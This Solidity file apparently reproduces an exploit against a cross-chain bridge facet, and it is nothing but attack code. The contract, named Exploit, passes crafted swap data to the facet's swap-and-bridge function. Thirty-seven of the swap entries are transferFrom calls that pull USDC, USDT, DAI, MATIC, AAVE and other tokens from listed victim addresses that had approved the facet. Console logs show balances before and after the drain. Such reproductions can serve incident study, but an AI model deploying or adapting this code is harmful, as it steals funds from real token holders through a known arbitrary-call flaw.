// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./LiFi/CBridgeFacet.sol";
import "./Interfaces/ILiFi.sol";
import "./Interfaces/ICBridge.sol";
import "./Libraries/LibSwap.sol";

import "hardhat/console.sol";

contract Exploit {
	CBridgeFacet public constant cBridgeFacet = CBridgeFacet(0x5A9Fd7c39a6C488E715437D7b1f3C823d5596eD1);
	ICBridge public constant cBridge = ICBridge(0x5427FEFA711Eff984124bFBB1AB6fbf5E3DA1820);
	address public constant ZeroEx = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF;

	ERC20 public constant USDT = ERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
	ERC20 public constant USDC = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
	ERC20 public constant MATIC = ERC20(0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0);
	ERC20 public constant RPL = ERC20(0xB4EFd85c19999D84251304bDA99E90B92300Bd93);
	ERC20 public constant GNO = ERC20(0x6810e776880C02933D47DB1b9fc05908e5386b96);
	ERC20 public constant MVI = ERC20(0x72e364F2ABdC788b7E918bc238B21f109Cd634D7);
	ERC20 public constant AUDIO = ERC20(0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998);
	ERC20 public constant AAVE = ERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9);
	ERC20 public constant JRT = ERC20(0x8A9C67fee641579dEbA04928c4BC45F66e26343A);
	ERC20 public constant DAI = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

	function transferAmount(ERC20 erc20, address victim) private view returns(uint256) {
		uint256 allowance = erc20.allowance(victim, address(cBridgeFacet));
		uint256 balance = erc20.balanceOf(victim);

		if (allowance <= balance) {
			return allowance;
		} else {
			return balance;
		}
	}

	function run(bytes memory _callData) public {
		console.log("[+] (0) Start states:");
		console.log("[+]     (Facet) USDT: %s", USDT.balanceOf(address(cBridgeFacet)));
		console.log("[+]     (Facet) USDC: %s", USDC.balanceOf(address(cBridgeFacet)));
		console.log("[+]     (Bridge) USDT: %s", USDT.balanceOf(address(cBridge)));
		console.log("[+]     (Bridge) USDC: %s", USDC.balanceOf(address(cBridge)));

		ILiFi.LiFiData memory _lifiData;
		_lifiData.transactionId = bytes32(uint256(0x1337));

		LibSwap.SwapData[] memory _swapData = new LibSwap.SwapData[](38);
		_swapData[0].callTo = ZeroEx;
		_swapData[0].approveTo = ZeroEx;
		_swapData[0].sendingAssetId = address(USDT);
		_swapData[0].receivingAssetId = address(USDC);
		_swapData[0].fromAmount = USDT.balanceOf(address(this));
		_swapData[0].callData = _callData;

		_swapData[1].callTo = address(MATIC);
		_swapData[1].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x445C21166a3Cb20b14FA84Cfc5D122F6bd3fFa17,
			address(this),
			transferAmount(MATIC, 0x445C21166a3Cb20b14FA84Cfc5D122F6bd3fFa17)
		);

		_swapData[2].callTo = address(MATIC);
		_swapData[2].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x9b36f2bc04CD5B8a38715664263A3B3B856Bc1CF,
			address(this),
			transferAmount(MATIC, 0x9b36f2bc04CD5B8a38715664263A3B3B856Bc1CF)
		);

		_swapData[3].callTo = address(RPL);
		_swapData[3].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x5a7517B2a3a390AaeC27d24B1621d0b9D7898dD4,
			address(this),
			transferAmount(RPL, 0x5a7517B2a3a390AaeC27d24B1621d0b9D7898dD4)
		);

		_swapData[4].callTo = address(GNO);
		_swapData[4].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x9241f27DafFd0bb1Df4f2A022584Dd6C77843E64,
			address(this),
			transferAmount(GNO, 0x9241f27DafFd0bb1Df4f2A022584Dd6C77843E64)
		);

		_swapData[5].callTo = address(USDT);
		_swapData[5].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x8de133a0859B847623c282b4dc5E18dE5dBFD7d1,
			address(this),
			transferAmount(USDT, 0x8de133a0859B847623c282b4dc5E18dE5dBFD7d1)
		);

		_swapData[6].callTo = address(USDT);
		_swapData[6].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x9241f27DafFd0bb1Df4f2A022584Dd6C77843E64,
			address(this),
			transferAmount(USDT, 0x9241f27DafFd0bb1Df4f2A022584Dd6C77843E64)
		);

		_swapData[7].callTo = address(USDT);
		_swapData[7].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0xD92b2A99da006E72B48A14E4c23766E22B4ce395,
			address(this),
			transferAmount(USDT, 0xD92b2A99da006E72B48A14E4c23766E22B4ce395)
		);

		_swapData[8].callTo = address(USDT);
		_swapData[8].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0xFfd2a8f4275E76288D31DBb756Ce0e6065A3D766,
			address(this),
			transferAmount(USDT, 0xFfd2a8f4275E76288D31DBb756Ce0e6065A3D766)
		);

		_swapData[9].callTo = address(USDT);
		_swapData[9].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x7C89a5373312F9a02DD5c5834B4F2e3E6ce1Cd96,
			address(this),
			transferAmount(USDT, 0x7C89a5373312F9a02DD5c5834B4F2e3E6ce1Cd96)
		);

		_swapData[10].callTo = address(USDT);
		_swapData[10].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x5b9E4D0Dd21f4E071729A9eB522A2366AbeD149a,
			address(this),
			transferAmount(USDT, 0x5b9E4D0Dd21f4E071729A9eB522A2366AbeD149a)
		);

		_swapData[11].callTo = address(USDT);
		_swapData[11].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x684ABeBa554FDB4A5DAE32D652F198E25b64Dc6E,
			address(this),
			transferAmount(USDT, 0x684ABeBa554FDB4A5DAE32D652F198E25b64Dc6E)
		);

		_swapData[12].callTo = address(MVI);
		_swapData[12].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x15697225D98885A4B007381cCf0006270D851A35,
			address(this),
			transferAmount(MVI, 0x15697225D98885A4B007381cCf0006270D851A35)
		);

		_swapData[13].callTo = address(USDC);
		_swapData[13].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0xDFFD8BBf8dcAF236C4e009Ff6013Bfc98407B6C0,
			address(this),
			transferAmount(USDC, 0xDFFD8BBf8dcAF236C4e009Ff6013Bfc98407B6C0)
		);

		_swapData[14].callTo = address(USDC);
		_swapData[14].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x2182e4F2034bF5451F168d0643B2083150Ab7931,
			address(this),
			transferAmount(USDC, 0x2182e4F2034bF5451F168d0643B2083150Ab7931)
		);

		_swapData[15].callTo = address(USDC);
		_swapData[15].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x195b8b9598904b55e9770492bD697529492034a2,
			address(this),
			transferAmount(USDC, 0x195b8b9598904b55e9770492bD697529492034a2)
		);

		_swapData[16].callTo = address(USDC);
		_swapData[16].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x5B7ab4B4B4768923cDdef657084223528C807963,
			address(this),
			transferAmount(USDC, 0x5B7ab4B4B4768923cDdef657084223528C807963)
		);

		_swapData[17].callTo = address(USDC);
		_swapData[17].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x80e7Ed83354833aA7B87988F7e0426cFfE238A83,
			address(this),
			transferAmount(USDC, 0x80e7Ed83354833aA7B87988F7e0426cFfE238A83)
		);

		_swapData[18].callTo = address(USDC);
		_swapData[18].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x0586fCc2D0d400596Ff326f30DEBAa3A79E33C25,
			address(this),
			transferAmount(USDC, 0x0586fCc2D0d400596Ff326f30DEBAa3A79E33C25)
		);

		_swapData[19].callTo = address(USDC);
		_swapData[19].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0xCC77Df7e9959C60e7eC427367E1Ae6E2720d6735,
			address(this),
			transferAmount(USDC, 0xCC77Df7e9959C60e7eC427367E1Ae6E2720d6735)
		);

		_swapData[20].callTo = address(USDC);
		_swapData[20].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x45372CCE828e185bfB008942CfE42a4C5cc76A75,
			address(this),
			transferAmount(USDC, 0x45372CCE828e185bfB008942CfE42a4C5cc76A75)
		);

		_swapData[21].callTo = address(USDC);
		_swapData[21].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x14B2AF25e47f590a145aad5bE781687CA20eDd97,
			address(this),
			transferAmount(USDC, 0x14B2AF25e47f590a145aad5bE781687CA20eDd97)
		);

		_swapData[22].callTo = address(USDC);
		_swapData[22].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x3942Ae3782FbD658CC19A8Db602D937baF7CB57A,
			address(this),
			transferAmount(USDC, 0x3942Ae3782FbD658CC19A8Db602D937baF7CB57A)
		);

		_swapData[23].callTo = address(USDC);
		_swapData[23].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x461e76A4fE9f27605d4097A646837c32F1ccc31c,
			address(this),
			transferAmount(USDC, 0x461e76A4fE9f27605d4097A646837c32F1ccc31c)
		);

		_swapData[24].callTo = address(USDC);
		_swapData[24].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x00DACfD769BC30e4F64805761707573cB710552c,
			address(this),
			transferAmount(USDC, 0x00DACfD769BC30e4F64805761707573cB710552c)
		);

		_swapData[25].callTo = address(USDC);
		_swapData[25].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0xe5aedd6520c4D4e0cb4Ee78784a0187D34d55ADC,
			address(this),
			transferAmount(USDC, 0xe5aedd6520c4D4e0cb4Ee78784a0187D34d55ADC)
		);

		_swapData[26].callTo = address(USDC);
		_swapData[26].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x574A782a00dd152D98fF85104F723575d870698e,
			address(this),
			transferAmount(USDC, 0x574A782a00dd152D98fF85104F723575d870698e)
		);

		_swapData[27].callTo = address(USDC);
		_swapData[27].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x899Cc16C88173dE60f3c830d004507F8Da3F975F,
			address(this),
			transferAmount(USDC, 0x899Cc16C88173dE60f3c830d004507F8Da3F975F)
		);

		_swapData[28].callTo = address(USDC);
		_swapData[28].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0xaCf65A171c67A7074Ee671240967696Ab5D1185F,
			address(this),
			transferAmount(USDC, 0xaCf65A171c67A7074Ee671240967696Ab5D1185F)
		);

		_swapData[29].callTo = address(USDC);
		_swapData[29].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x2E70C44b708028A925A8021723AC92fb641292dF,
			address(this),
			transferAmount(USDC, 0x2E70C44b708028A925A8021723AC92fb641292dF)
		);

		_swapData[30].callTo = address(AUDIO);
		_swapData[30].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0xB0d497A6CfF14E0A0079d5FeFf0C51c929F5Fc8D,
			address(this),
			transferAmount(AUDIO, 0xB0d497A6CfF14E0A0079d5FeFf0C51c929F5Fc8D)
		);

		_swapData[31].callTo = address(AAVE);
		_swapData[31].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x26ab154C70AEC017d78E6241da76949c37b171e2,
			address(this),
			transferAmount(AAVE, 0x26ab154C70AEC017d78E6241da76949c37b171e2)
		);

		_swapData[32].callTo = address(JRT);
		_swapData[32].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0xdba64f019c92649CF645D598322AE1aE2318e55b,
			address(this),
			transferAmount(JRT, 0xdba64f019c92649CF645D598322AE1aE2318e55b)
		);

		_swapData[33].callTo = address(DAI);
		_swapData[33].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x461e76A4fE9f27605d4097A646837c32F1ccc31c,
			address(this),
			transferAmount(DAI, 0x461e76A4fE9f27605d4097A646837c32F1ccc31c)
		);

		_swapData[34].callTo = address(DAI);
		_swapData[34].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x45f3fc38441B1aa7b60f8aAD8954582B17C9503c,
			address(this),
			transferAmount(DAI, 0x45f3fc38441B1aa7b60f8aAD8954582B17C9503c)
		);

		_swapData[35].callTo = address(DAI);
		_swapData[35].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x6E5c200A784ba062ab770E6d317637F2fC82E53d,
			address(this),
			transferAmount(DAI, 0x6E5c200A784ba062ab770E6d317637F2fC82E53d)
		);

		_swapData[36].callTo = address(DAI);
		_swapData[36].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x0bc06C67b5740b2Cc0a54d9281a7bCE5fd70984D,
			address(this),
			transferAmount(DAI, 0x0bc06C67b5740b2Cc0a54d9281a7bCE5fd70984D)
		);

		_swapData[37].callTo = address(DAI);
		_swapData[37].callData = abi.encodeWithSignature(
			"transferFrom(address,address,uint256)",
			0x0dF4fDE307f216A7Da118Ad7eaEC500D42EECc5F,
			address(this),
			transferAmount(DAI, 0x0dF4fDE307f216A7Da118Ad7eaEC500D42EECc5F)
		);

		CBridgeFacet.CBridgeData memory _cBridgeData;
		_cBridgeData.token = address(USDC);
		_cBridgeData.amount = 10 * 1e6;
		_cBridgeData.dstChainId = 1337;
		_cBridgeData.nonce = 1337;
		_cBridgeData.maxSlippage = cBridge.minimalMaxSlippage() + 100;

		cBridgeFacet.swapAndStartBridgeTokensViaCBridge(
			_lifiData,
			_swapData,
			_cBridgeData
		);

		console.log("[+] (1) Ending states:");
		console.log("[+]     (Facet) USDT: %s", USDT.balanceOf(address(cBridgeFacet)));
		console.log("[+]     (Facet) USDC: %s", USDC.balanceOf(address(cBridgeFacet)));
		console.log("[+]     (Bridge) USDT: %s", USDT.balanceOf(address(cBridge)));
		console.log("[+]     (Bridge) USDC: %s", USDC.balanceOf(address(cBridge)));

		console.log("[+]     USDT: %s", USDT.balanceOf(address(this)));
		console.log("[+]     USDC: %s", USDC.balanceOf(address(this)));
		console.log("[+]     MATIC: %s", MATIC.balanceOf(address(this)));
		console.log("[+]     RPL: %s", RPL.balanceOf(address(this)));
		console.log("[+]     GNO: %s", GNO.balanceOf(address(this)));
		console.log("[+]     MVI: %s", MVI.balanceOf(address(this)));
		console.log("[+]     AUDIO: %s", AUDIO.balanceOf(address(this)));
		console.log("[+]     AAVE: %s", AAVE.balanceOf(address(this)));
		console.log("[+]     JRT: %s", JRT.balanceOf(address(this)));
		console.log("[+]     DAI: %s", DAI.balanceOf(address(this)));
	}
}